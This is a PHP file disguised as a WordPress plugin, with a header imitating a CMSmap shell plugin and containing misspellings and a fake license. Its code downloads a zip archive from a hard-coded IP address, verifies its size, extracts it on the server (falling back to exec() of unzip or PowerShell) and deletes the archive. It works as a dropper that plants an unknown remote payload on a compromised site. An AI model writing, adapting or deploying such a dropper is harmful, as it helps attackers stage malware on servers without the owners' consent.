<?php
/**
 * Plugin Name: CMap - WordPress Shll
 * Plugin URI: https://github.com/mx/csmap/
 * Description: Simle WordPress Shll - Usage of CMSmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developer assumes no liability and is not responsible for any misuse or damage caused by this program.
 * Version: 1.2
 * Author: Cmap
 * Author URI: https://github.com/x/cmsmap/
 * License: GPLv55
 */

// Disable time limit for execution
set_time_limit(0);  // 0 means no time limit

// 配置部分
$zipFile = './gotest.zip';                // 下载的文件名
$downloadURL = 'http://107.189.29.12:58081/gotest.zip'; // 下载地址
$unzipDir = './gotest_dir';               // 解压目录
$maxRetries = 3;                          // 最大重试次数
$timeout = 300;                           // 下载超时时间（秒）

// 下载文件函数
function downloadFile($url, $destination, $timeout, $maxRetries) {
    $attempt = 0;

    while ($attempt < $maxRetries) {
        echo "Downloading $url (attempt " . ($attempt + 1) . ")\n";

        // 打开文件以写入
        $fp = fopen($destination, 'w');
        if (!$fp) {
            echo "Failed to open $destination for writing.\n";
            return false;
        }

        // 使用 cURL 下载文件
        $ch = curl_init($url);
        curl_setopt($ch, CURLOPT_FILE, $fp);
        curl_setopt($ch, CURLOPT_TIMEOUT, $timeout);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($ch, CURLOPT_FAILONERROR, true);

        $success = curl_exec($ch);
        $error = curl_error($ch);
        curl_close($ch);
        fclose($fp);

        if ($success) {
            echo "Download successful: $destination\n";
            return true;
        } else {
            echo "Download failed: $error\n";
        }

        $attempt++;
        sleep(1); // 等待 1 秒后重试
    }

    return false;
}

// 检查文件大小是否匹配
function checkFileSize($url, $localFile) {
    $headers = get_headers($url, 1);
    $remoteSize = isset($headers['Content-Length']) ? $headers['Content-Length'] : 0;
    $localSize = file_exists($localFile) ? filesize($localFile) : 0;

    return $remoteSize == $localSize;
}

// 使用 ZipArchive 解压
function unzipWithZipArchive($zipFile, $destination) {
    echo "Unzipping $zipFile using ZipArchive...\n";

    $zip = new ZipArchive();
    if ($zip->open($zipFile) === true) {
        $zip->extractTo($destination);
        $zip->close();
        echo "Unzipping successful.\n";
        return true;
    } else {
        echo "Failed to unzip $zipFile with ZipArchive.\n";
        return false;
    }
}

// 使用系统命令解压（支持 Windows 和 Linux）
function unzipWithSystemCommand($zipFile, $destination) {
    echo "Unzipping $zipFile using system command...\n";

    // 判断操作系统
    if (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') {
        $command = "powershell -Command \"Expand-Archive -Force -Path " . escapeshellarg($zipFile) . " -DestinationPath " . escapeshellarg($destination) . "\"";
    } else {
        $command = "unzip -o " . escapeshellarg($zipFile) . " -d " . escapeshellarg($destination);
    }

    exec($command, $output, $status);

    if ($status === 0) {
        echo "Unzipping successful.\n";
        return true;
    } else {
        echo "Failed to unzip $zipFile using system command.\n";
        return false;
    }
}

// 下载文件
if (!file_exists($zipFile)) {
    echo "File $zipFile does not exist. Attempting to download...\n";
    if (!downloadFile($downloadURL, $zipFile, $timeout, $maxRetries)) {
        echo "Failed to download $zipFile. Exiting script.\n";
        exit;
    }
}

// 检查文件大小
if (!checkFileSize($downloadURL, $zipFile)) {
    echo "File size mismatch. Redownloading...\n";
    unlink($zipFile);
    if (!downloadFile($downloadURL, $zipFile, $timeout, $maxRetries)) {
        echo "Failed to download correct $zipFile. Exiting script.\n";
        exit;
    }
}

// 解压文件
if (!is_dir($unzipDir)) {
    mkdir($unzipDir, 0755, true);
}

if (!unzipWithZipArchive($zipFile, $unzipDir)) {
    echo "ZipArchive failed, trying system command...\n";
    if (!unzipWithSystemCommand($zipFile, $unzipDir)) {
        echo "Failed to unzip $zipFile using both methods. Exiting script.\n";
        exit;
    }
}

// 清理下载文件
unlink($zipFile);
echo "Cleanup completed.\n";

?>
